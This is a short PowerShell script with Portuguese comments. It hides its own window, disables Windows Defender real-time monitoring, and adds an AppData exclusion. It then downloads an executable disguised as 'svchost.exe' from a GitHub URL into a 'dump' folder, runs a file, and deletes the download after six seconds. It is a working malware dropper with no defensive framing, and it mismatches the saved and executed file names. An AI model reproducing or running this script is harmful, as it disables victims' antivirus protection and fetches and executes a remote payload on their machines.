$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
add-type -name win -member $t -namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
Set-MpPreference -DisableRealtimeMonitoring $true
# Adicionar uma exclusÃ£o de caminho no Windows Defender
Add-MpPreference -ExclusionPath "$env:appdata"
# Criar o diretÃ³rio de trabalho
mkdir "$env:appdata\dump"
Set-Location "$env:appdata\dump"
# Baixar e executar sv.exe
Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/refs/heads/main/svchost.exe" -OutFile "$env:appdata\dump\svchost.exe"
./sv.exe
# Aguardar 6 segundos
Start-Sleep -Seconds 6
# Remover o arquivo baixado
Remove-Item -Path "$env:appdata\dump\svchost.exe" -Force
